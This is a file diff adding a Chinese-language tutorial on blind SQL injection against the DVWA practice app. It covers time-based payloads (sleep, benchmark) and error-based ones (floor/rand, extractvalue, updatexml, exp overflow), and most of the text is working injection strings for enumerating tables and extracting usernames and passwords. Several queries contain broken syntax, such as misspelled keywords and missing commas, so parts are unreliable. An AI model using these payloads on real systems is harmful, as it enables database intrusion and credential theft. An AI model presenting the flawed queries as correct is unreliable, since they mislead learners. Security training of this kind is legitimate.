@@ -1,0 +1,120 @@
+盲注是注入的一种,指的是在不知道数据库返回值的情况下对数据中的内容进行猜测,实施SQL注入。
+
+基于时间的盲注：
+
+时间的概念：使用特定函数让数据库去执行，在页面等待一定时间，来查看的的当前页面中注入
+
+函数sleep（）
+
+Select * from dvwa.users where user_id=1 and if(length(user())=14,sleep(5),’bye’);
+
+最终没有返回值，需要关注的是浏览器响应的时间
+
+函数benchmark（参数一，参数二），一边师执行多少次，二是某项操作。
+
+1、找注入点
+
+通过输入以下两行,根据返回的延迟判断存在字符型注入
+
+1 and sleep(5)#
+
+1' and sleep(5)#
+
+2、获取信息
+
+当前数据库长度
+
+Select * from dvwa.users where user_id=1 and if(length(database())=4,sleep(5),’bye’);
+
+获取每个字符
+
+Select * from dvwa.users where user_id=1 and if(ascii(substring(database(),1,1))=114,sleep(5),’bye’);
+
+获取数据库中表
+
+Select * from dvwa.users where user_id=1 and if(ascii(mid((select distinc table_name from information_schema.colums where table_schema=database() limit 0,1)1,1))=102,sleep(5),’bye’);
+
+猜解第一个表的长度
+
+1' and if(length((select table_name from information_schema.tables where table_schema='dvwa' limit 0,1))=9,sleep(5),1)#
+
+猜解第二个表的长度
+
+1' and if(length((select table_name from information_schema.tables where table_schema='dvwa' limit 1,1))=5,sleep(5),1)#
+
+找有价值的表，users
+
+4、获取指定表中的字段
+
+Select * from dvwa.users where user_id=1 and if(ascii(mid((select distinc columns_name from information_schema.colums where table_schema=database() and table_name=’users’limit 0,1)1,1))=102,sleep(5),’bye’);
+
+找有意义的字段username password
+
+5、获取内容
+
+Select * from dvwa.users where user_id=1 and if(ascii(mid((select concat(admin,0x7e,password)from users limit 0,1)1,1))=102,sleep(5),’bye’);
+
+6、破解密码
+
+基于报错的盲注
+
+主要是依赖于几个报错函数
+
+1、floor()
+
+Floor()函数返回小鱼等于该值的最大整数，向下舍入为指定小数位数
+
+floor()报错注入准确地说应该是floor(rand(0)*2),count,group by冲突报错:
+
+Floor(rand(0)*2)会以011011.....的形式产生随机数，count+group by会生成虚拟表，在第二次group by的时候会出现主键冗余的异常，也就是所谓的floor()报错。
+
+基本的floor注入的payload：
+
+and select 1 from (select count(*),concat(database(),floor(rand(0)*2))x from information_schema.tables group by x)a
+
+在数据库中执行
+
+报错，函数database（）得到执行
+
+2、ExtracValue()
+
+ExtractValue()接受两个字符串参数，一个XML标记片段 xml_frag和一个XPath表达式 。
+
+这里如果Xpath格式语法书写错误的话，就会报错。这里就是利用这个特性来获得我们想要知道的内容。
+
+Payload：id=1 and extractvalue(1, concat(0x7e, (select table_name from information_schema.tables limit 1)))
+
+在数据库中执行：
+
+报错：
+
+3、UpdateXml()
+
+UPDATEXML (XML_document, XPath_string, new_value);
+
+XML_document是String格式，为XML文档对象的名称，文中为Doc，XPath_string (Xpath格式的字符串) ，new_value，String格式，替换查找到的符合条件的数据。
+
+如果不符合XPath的格式要求，就会报错，我们利用这一点进行报错注入
+
+Payload：id=1 and 1=(updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1))
+
+在数据库中执行：
+
+报错
+
+4、Exp()
+
+exp是以e为底的指数函数。
+
+但是这个参数过大的话会溢出，在参数大于709时溢出，报错
+
+将0按位取反就会返回“18446744073709551615”，再加上函数成功执行后返回0的缘故，我们将成功执行的函数取反就会得到最大的无符号BIGINT值。
+
+利用子查询和按位取反，就可以构造双溢出的报错：
+
+select exp(~(select * from(select database())x));
+
+据此构造payload
+
+select exp(~(select*from(select user())x));
+
